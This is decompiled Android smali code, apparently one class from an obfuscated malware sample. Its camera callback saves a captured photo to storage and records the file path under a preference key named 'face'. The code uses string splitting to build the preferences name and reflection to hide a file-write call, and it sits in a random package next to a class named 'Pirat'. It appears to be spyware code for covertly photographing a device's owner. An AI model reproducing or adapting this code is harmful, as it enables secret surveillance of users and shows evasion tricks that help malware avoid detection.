.class Lazz/oof/aucvvgjsxswe/FotoM$1;
.super Ljava/lang/Object;
.source "FotoM.java"

# interfaces
.implements Landroid/hardware/Camera$PictureCallback;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lazz/oof/aucvvgjsxswe/FotoM;->doInBackground([Ljava/lang/String;)Ljava/lang/String;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lazz/oof/aucvvgjsxswe/FotoM;


# direct methods
.method constructor <init>(Lazz/oof/aucvvgjsxswe/FotoM;)V
    .locals 0

    .prologue
    .line 1
    iput-object p1, p0, Lazz/oof/aucvvgjsxswe/FotoM$1;->this$0:Lazz/oof/aucvvgjsxswe/FotoM;

    .line 146
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public onPictureTaken([BLandroid/hardware/Camera;)V
    .locals 17
    .param p1, "data"    # [B
    .param p2, "camera"    # Landroid/hardware/Camera;

    .prologue
    .line 150
    move-object/from16 v0, p0

    iget-object v12, v0, Lazz/oof/aucvvgjsxswe/FotoM$1;->this$0:Lazz/oof/aucvvgjsxswe/FotoM;

    invoke-static {v12}, Lazz/oof/aucvvgjsxswe/FotoM;->access$1(Lazz/oof/aucvvgjsxswe/FotoM;)Ljava/io/File;

    move-result-object v9

    .line 152
    .local v9, "pictureFileDir":Ljava/io/File;
    invoke-virtual {v9}, Ljava/io/File;->exists()Z

    move-result v12

    if-nez v12, :cond_0

    invoke-virtual {v9}, Ljava/io/File;->mkdirs()Z

    move-result v12

    if-nez v12, :cond_0

    .line 155
    const-string v6, "oc"

    .line 156
    .local v6, "fsd":Ljava/lang/String;
    move-object/from16 v0, p0

    iget-object v12, v0, Lazz/oof/aucvvgjsxswe/FotoM$1;->this$0:Lazz/oof/aucvvgjsxswe/FotoM;

    invoke-static {v12}, Lazz/oof/aucvvgjsxswe/FotoM;->access$2(Lazz/oof/aucvvgjsxswe/FotoM;)Landroid/content/Context;

    move-result-object v12

    new-instance v13, Ljava/lang/StringBuilder;

    const-string v14, "c"

    invoke-direct {v13, v14}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v13, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v13

    const-string v14, "on"

    invoke-virtual {v13, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v13

    invoke-virtual {v13}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v13

    const/4 v14, 0x0

    invoke-virtual {v12, v13, v14}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v11

    .line 157
    .local v11, "settings":Landroid/content/SharedPreferences;
    new-instance v10, Lazz/oof/aucvvgjsxswe/Pirat;

    invoke-direct {v10, v11}, Lazz/oof/aucvvgjsxswe/Pirat;-><init>(Landroid/content/SharedPreferences;)V

    .line 158
    .local v10, "rtrtr":Lazz/oof/aucvvgjsxswe/Pirat;
    invoke-virtual {v10}, Lazz/oof/aucvvgjsxswe/Pirat;->gett()Landroid/content/SharedPreferences$Editor;

    move-result-object v3

    .line 159
    .local v3, "editor":Landroid/content/SharedPreferences$Editor;
    const-string v12, "camera"

    const/4 v13, 0x2

    invoke-interface {v3, v12, v13}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    .line 160
    invoke-interface {v3}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 192
    .end local v3    # "editor":Landroid/content/SharedPreferences$Editor;
    .end local v6    # "fsd":Ljava/lang/String;
    .end local v10    # "rtrtr":Lazz/oof/aucvvgjsxswe/Pirat;
    .end local v11    # "settings":Landroid/content/SharedPreferences;
    :goto_0
    return-void

    .line 165
    :cond_0
    new-instance v2, Ljava/text/SimpleDateFormat;

    const-string v12, "yyyymmddhhmmss"

    invoke-direct {v2, v12}, Ljava/text/SimpleDateFormat;-><init>(Ljava/lang/String;)V

    .line 166
    .local v2, "dateFormat":Ljava/text/SimpleDateFormat;
    new-instance v12, Ljava/util/Date;

    invoke-direct {v12}, Ljava/util/Date;-><init>()V

    invoke-virtual {v2, v12}, Ljava/text/SimpleDateFormat;->format(Ljava/util/Date;)Ljava/lang/String;

    move-result-object v1

    .line 167
    .local v1, "date":Ljava/lang/String;
    new-instance v12, Ljava/lang/StringBuilder;

    const-string v13, "Picture_"

    invoke-direct {v12, v13}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v12, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v12

    const-string v13, ".jpg"

    invoke-virtual {v12, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v12

    invoke-virtual {v12}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    .line 169
    .local v7, "photoFile":Ljava/lang/String;
    new-instance v12, Ljava/lang/StringBuilder;

    invoke-virtual {v9}, Ljava/io/File;->getPath()Ljava/lang/String;

    move-result-object v13

    invoke-static {v13}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v13

    invoke-direct {v12, v13}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-object v13, Ljava/io/File;->separator:Ljava/lang/String;

    invoke-virtual {v12, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v12

    invoke-virtual {v12, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v12

    invoke-virtual {v12}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    .line 171
    .local v4, "filename":Ljava/lang/String;
    new-instance v8, Ljava/io/File;

    invoke-direct {v8, v4}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 174
    .local v8, "pictureFile":Ljava/io/File;
    :try_start_0
    new-instance v5, Ljava/io/FileOutputStream;

    invoke-direct {v5, v8}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V

    .line 175
    .local v5, "fos":Ljava/io/FileOutputStream;
    invoke-virtual {v5}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v12

    const-string v13, "write"

    const/4 v14, 0x1

    new-array v14, v14, [Ljava/lang/Class;

    const/4 v15, 0x0

    const-class v16, [B

    aput-object v16, v14, v15

    invoke-virtual {v12, v13, v14}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v12

    const/4 v13, 0x1

    new-array v13, v13, [Ljava/lang/Object;

    const/4 v14, 0x0

    aput-object p1, v13, v14

    invoke-virtual {v12, v5, v13}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    .line 177
    invoke-virtual {v5}, Ljava/io/FileOutputStream;->close()V

    .line 180
    const-string v6, "oc"

    .line 181
    .restart local v6    # "fsd":Ljava/lang/String;
    move-object/from16 v0, p0

    iget-object v12, v0, Lazz/oof/aucvvgjsxswe/FotoM$1;->this$0:Lazz/oof/aucvvgjsxswe/FotoM;

    invoke-static {v12}, Lazz/oof/aucvvgjsxswe/FotoM;->access$2(Lazz/oof/aucvvgjsxswe/FotoM;)Landroid/content/Context;

    move-result-object v12

    new-instance v13, Ljava/lang/StringBuilder;

    const-string v14, "c"

    invoke-direct {v13, v14}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v13, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v13

    const-string v14, "on"

    invoke-virtual {v13, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v13

    invoke-virtual {v13}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v13

    const/4 v14, 0x0

    invoke-virtual {v12, v13, v14}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v11

    .line 182
    .restart local v11    # "settings":Landroid/content/SharedPreferences;
    new-instance v10, Lazz/oof/aucvvgjsxswe/Pirat;

    invoke-direct {v10, v11}, Lazz/oof/aucvvgjsxswe/Pirat;-><init>(Landroid/content/SharedPreferences;)V

    .line 183
    .restart local v10    # "rtrtr":Lazz/oof/aucvvgjsxswe/Pirat;
    invoke-virtual {v10}, Lazz/oof/aucvvgjsxswe/Pirat;->gett()Landroid/content/SharedPreferences$Editor;

    move-result-object v3

    .line 184
    .restart local v3    # "editor":Landroid/content/SharedPreferences$Editor;
    const-string v12, "camera"

    const/4 v13, 0x1

    invoke-interface {v3, v12, v13}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    .line 185
    const-string v12, "face"

    invoke-interface {v3, v12, v4}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 188
    invoke-interface {v3}, Landroid/content/SharedPreferences$Editor;->commit()Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto/16 :goto_0

    .line 189
    .end local v3    # "editor":Landroid/content/SharedPreferences$Editor;
    .end local v5    # "fos":Ljava/io/FileOutputStream;
    .end local v6    # "fsd":Ljava/lang/String;
    .end local v10    # "rtrtr":Lazz/oof/aucvvgjsxswe/Pirat;
    .end local v11    # "settings":Landroid/content/SharedPreferences;
    :catch_0
    move-exception v12

    goto/16 :goto_0
.end method
